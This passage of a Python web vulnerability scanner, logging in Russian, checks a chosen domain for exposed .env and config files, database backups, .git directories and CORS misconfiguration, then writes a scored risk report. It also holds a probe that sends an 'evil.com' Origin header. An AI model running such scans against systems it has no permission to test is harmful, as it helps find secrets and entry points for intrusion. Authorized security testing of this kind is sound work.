        await self.log(f"[*] Проверка конфигурационных файлов...", "WARNING")

        config_files = [
            '.env', '.env.example', '.env.local',
            'config.php', 'settings.php', 'wp-config.php',
            'config.xml', 'web.config', '.htaccess', '.htpasswd',
            'robots.txt'
        ]

        for config_file in config_files:
            url = f"http://{self.domain}/{config_file}"
            try:
                response = await asyncio.to_thread(self.session.get, url, timeout=3, verify=False)
                if response.status_code == 200:
                    await self.log(f"[!] Конфигурационный файл доступен: {url}", "ERROR")
                    self.results['vulnerabilities'].append(f"Configuration file exposed: {config_file}")
                    self.results['security_score'] -= 10

                    if '.env' in config_file or 'config.php' in config_file:
                        content = response.text[:500]
                        if 'password' in content.lower() or 'secret' in content.lower():
                            await self.log(f"[!] КРИТИЧЕСКИ: Секреты в конфиг файле!", "ERROR")
                            self.results['critical_vulns'].append(f"Secrets in config file: {config_file}")
                            self.results['security_score'] -= 25
            except:
                pass

    async def check_backup_files(self):
        await self.log(f"[*] Проверка файлов резервных копий...", "WARNING")

        backup_files = [
            'backup.zip', 'backup.tar', 'backup.tar.gz',
            'backup.sql', 'database.zip', 'database.sql',
            'db.zip', 'db.sql', 'dump.zip', 'dump.sql'
        ]

        for backup_file in backup_files:
            url = f"http://{self.domain}/{backup_file}"
            try:
                response = await asyncio.to_thread(self.session.head, url, timeout=3, verify=False)
                if response.status_code == 200:
                    await self.log(f"[!] Бэкап файл доступен: {url}", "ERROR")
                    self.results['vulnerabilities'].append(f"Backup file exposed: {backup_file}")
                    self.results['security_score'] -= 15
            except:
                pass

    async def check_source_code_leakage(self):
        await self.log(f"[*] Проверка утечки исходного кода...", "WARNING")

        source_files = [
            '.git/HEAD', '.git/config',
            '.svn/entries', '.hg/store',
            'README.md', 'LICENSE',
            'composer.json', 'package.json'
        ]

        for source_file in source_files:
            url = f"http://{self.domain}/{source_file}"
            try:
                response = await asyncio.to_thread(self.session.get, url, timeout=3, verify=False)
                if response.status_code == 200:
                    await self.log(f"[!] Исходный код доступен: {url}", "ERROR")
                    self.results['vulnerabilities'].append(f"Source code exposed: {source_file}")
                    self.results['security_score'] -= 10

                    if '.git' in source_file:
                        await self.log(f"[!] КРИТИЧЕСКИ: Git репозиторий доступен!", "ERROR")
                        self.results['critical_vulns'].append("Git repository exposed")
                        self.results['security_score'] -= 20
            except:
                pass

    async def check_cors_misconfiguration(self):
        await self.log(f"[*] Проверка конфигурации CORS...", "WARNING")

        try:
            headers = {'Origin': 'https://evil.com'}
            response = await asyncio.to_thread(self.session.get, f"http://{self.domain}", headers=headers, timeout=5, verify=False)

            if 'Access-Control-Allow-Origin' in response.headers:
                cors_header = response.headers['Access-Control-Allow-Origin']
                await self.log(f"[?] Заголовок CORS: {cors_header}", "INFO")

            if cors_header == '*':
                await self.log(f"[!] CORS неправильно настроен: Wildcard origin", "ERROR")
                self.results['vulnerabilities'].append("CORS wildcard origin")
                self.results['security_score'] -= 10
            elif 'Access-Control-Allow-Credentials' in response.headers and response.headers[
                'Access-Control-Allow-Credentials'].lower() == 'true':
                await self.log(f"[!] CORS с credentials разрешен", "ERROR")
                self.results['vulnerabilities'].append("CORS with credentials")
                self.results['security_score'] -= 15
        except:
            pass

    async def save_results(self):
        filename = f"scan_{self.domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        self.results['security_score'] = max(0, self.results['security_score'])

        risk_level = "КРИТИЧЕСКИЙ" if self.results['security_score'] < 30 else \
            "ВЫСОКИЙ" if self.results['security_score'] < 50 else \
                "СРЕДНИЙ" if self.results['security_score'] < 70 else \
                    "НИЗКИЙ" if self.results['security_score'] < 90 else "БЕЗОПАСНО"

        self.results['risk_level'] = risk_level

        def write_json():
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)

        await asyncio.to_thread(write_json)
        await self.log(f"\n[+] Результаты сохранены в {filename}", "SUCCESS")

        txt_filename = filename.replace('.json', '.txt')
        
        def write_txt():
            with open(txt_filename, 'w', encoding='utf-8') as f:
                f.write(f"ОТЧЕТ ПО БЕЗОПАСНОСТИ\n")
                f.write(f"Цель: {self.domain}\n")
                f.write(f"Время сканирования: {self.results['scan_time']}\n")
                f.write(f"Оценка безопасности: {self.results['security_score']}/100\n")
                f.write(f"Уровень риска: {risk_level}\n")
                f.write("=" * 80 + "\n\n")

                if self.results['critical_vulns']:
                    f.write("КРИТИЧЕСКИЕ УЯЗВИМОСТИ:\n")
                    for vuln in self.results['critical_vulns']:
                        f.write(f"  [КРИТИЧЕСКИ] {vuln}\n")
                    f.write("\n")

                if self.results['vulnerabilities']:
                    f.write("УЯЗВИМОСТИ:\n")
                    for vuln in self.results['vulnerabilities']:
                        f.write(f"  [-] {vuln}\n")
                    f.write("\n")

                if self.results['ports']:
                    open_ports = [p for p in self.results['ports'] if p.get('state') == 'open']
                    f.write(f"ОТКРЫТЫЕ ПОРТЫ ({len(open_ports)}):\n")
                    for port in open_ports:
                        f.write(f"  [+] {port.get('port')}/{port.get('protocol', 'tcp')}: {port.get('service', '')}\n")
                    f.write("\n")

                if self.results['subdomains']:
                    f.write(f"ПОДДОМЕНЫ ({len(self.results['subdomains'])}):\n")
                    for sub in self.results['subdomains'][:10]:
                        f.write(f"  [+] {sub}\n")

        await asyncio.to_thread(write_txt)
        await self.log(f"[+] Текстовый отчет сохранен в {txt_filename}", "SUCCESS")

    async def run_full_scan(self):
        banner = f"""
{Fore.RED}
╔═╗┬ ┬┌─┐┬─┐┌─┐┌─┐  ╔═╗┌─┐┌┬┐┌─┐┌─┐┬─┐┌┬┐
╠═╝└┬┘├─┘├┬┘├┤ └─┐  ╚═╗├┤  │ ├┤ ├┤ ├┬┘ │ 
╩   ┴ ┴  ┴└─└─┘└─┘  ╚═╝└─┘ ┴ └─┘└─┘┴└─ ┴ 
{Fore.RESET}
{Fore.YELLOW}              ULTIMATE SECURITY ANALYZER
{Fore.RED}               FOR AUTHORIZED TESTING ONLY!
{Fore.RESET}
        """
        if self.log_callback:
             await self.log_callback(banner, "INFO")
        else:
             print(banner)

        try:
            await self.check_dns()
            await self.check_http_https()
            await self.check_ssl_certificate()
            await self.full_port_scan()
            await self.check_whois()
            await self.directory_bruteforce()
            await self.check_vulnerabilities()

            await self.print_banner("СКАНИРОВАНИЕ ЗАВЕРШЕНО")

            await self.log(f"\n{'=' * 80}", "DEBUG")
            await self.log(f"СВОДКА ДЛЯ: {self.domain}", "WARNING")
            await self.log(f"{'=' * 80}", "DEBUG")

            await self.log(f"[+] Оценка безопасности: {self.results['security_score']}/100", "SUCCESS")

            risk_level = "КРИТИЧЕСКИЙ" if self.results['security_score'] < 30 else \
                "ВЫСОКИЙ" if self.results['security_score'] < 50 else \
                    "СРЕДНИЙ" if self.results['security_score'] < 70 else \
                        "НИЗКИЙ" if self.results['security_score'] < 90 else "БЕЗОПАСНО"
            
            risk_color_level = "ERROR" if risk_level == "КРИТИЧЕСКИЙ" else \
                               "WARNING" if risk_level == "ВЫСОКИЙ" else \
                               "WARNING" if risk_level == "СРЕДНИЙ" else \
                               "SUCCESS" if risk_level == "НИЗКИЙ" else "SUCCESS"

            await self.log(f"[+] Уровень риска: {risk_level}", risk_color_level)

            if self.results['critical_vulns']:
                await self.log(f"\n[!] НАЙДЕНЫ КРИТИЧЕСКИЕ УЯЗВИМОСТИ ({len(self.results['critical_vulns'])}):", "ERROR")
                for vuln in self.results['critical_vulns']:
                    await self.log(f"    ● {vuln}", "ERROR")

            if self.results['vulnerabilities']:
                await self.log(f"\n[!] НАЙДЕНЫ УЯЗВИМОСТИ ({len(self.results['vulnerabilities'])}):", "WARNING")
                for vuln in self.results['vulnerabilities'][:10]:
                    await self.log(f"    ● {vuln}", "WARNING")

            open_ports = [p for p in self.results['ports'] if p.get('state') == 'open']
            if open_ports:
                await self.log(f"\n[+] OPEN PORTS ({len(open_ports)}):", "DEBUG")
                for port in open_ports:
                    await self.log(f"    ● {port.get('port')}/{port.get('protocol', 'tcp')}: {port.get('service', '')}", "DEBUG")

            await self.generate_ai_feedback()

            await self.save_results()

            await self.log(f"\n[+] Scan completed successfully!", "SUCCESS")
            await self.log(f"[!] Remember: This tool is for authorized security testing only!", "WARNING")

        except asyncio.CancelledError:
            await self.log(f"\n[!] Scan interrupted by user", "WARNING")
            await self.save_results()
        except Exception as e:
            await self.log(f"[-] Critical error: {e}", "ERROR")
            import traceback
            traceback.print_exc()
            await self.save_results()


async def main_async():
    if len(sys.argv) > 1:
        domain = sys.argv[1]
    else:
        domain = input(f"{Fore.CYAN}[?] Enter domain (example.com): {Fore.RESET}").strip()

    if not domain:
        print(f"{Fore.RED}[-] No domain specified")
        return

    domain = domain.replace('http://', '').replace('https://', '').replace('www.', '').split('/')[0]

    analyzer = UltimateSecurityAnalyzer(domain)
    await analyzer.run_full_scan()


if __name__ == "__main__":
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Program terminated")
    except Exception as e:
        print(f"{Fore.RED}[-] Fatal error: {e}")
